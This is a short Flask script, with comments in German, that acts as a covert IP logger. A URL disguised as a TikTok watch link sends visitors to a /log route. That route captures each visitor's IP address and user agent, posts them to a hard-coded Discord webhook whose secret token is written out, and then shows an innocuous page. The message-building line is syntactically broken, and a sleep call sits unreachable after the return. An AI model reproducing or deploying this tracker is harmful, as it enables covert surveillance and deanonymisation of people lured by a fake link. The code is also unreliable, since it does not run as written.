from flask import Flask, request, redirect, render_template
import requests
import os
import time
from werkzeug.middleware.proxy_fix import ProxyFix

app = Flask(__name__)

app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_port=1, x_prefix=1)

WEBHOOK_URL = "https://discord.com/api/webhooks/1527235730055630858/VLFC3_nVPd0zdVMZLN5A9utw1oWapMWx0MLIKXYYKv551KmndGOKbITTiKO-Hc57evMT"

@app.route('/')
def home():
    return redirect("https://tiktok-watch-id-2aa9dj5ak8a7g1i29hf.onrender.com/log")

@app.route('/log')
def log_ip():
    # Robuste IP-Ermittlung
    if request.headers.get('X-Forwarded-For'):
        ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
    elif request.headers.get('X-Real-IP'):
        ip = request.headers.get('X-Real-IP')
    else:
        ip = request.remote_addr
    
    user_agent = request.headers.get('User-Agent')
    data = {"content": f"**IP-LOG:** {ip} 
    
    try:
        r = requests.post(WEBHOOK_URL, json=data, timeout=10)
        print("Webhook Status:", r.status_code)
    except Exception as e:
        print("Error:", str(e))
    
    return render_template('index.html')
    time.sleep(2)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
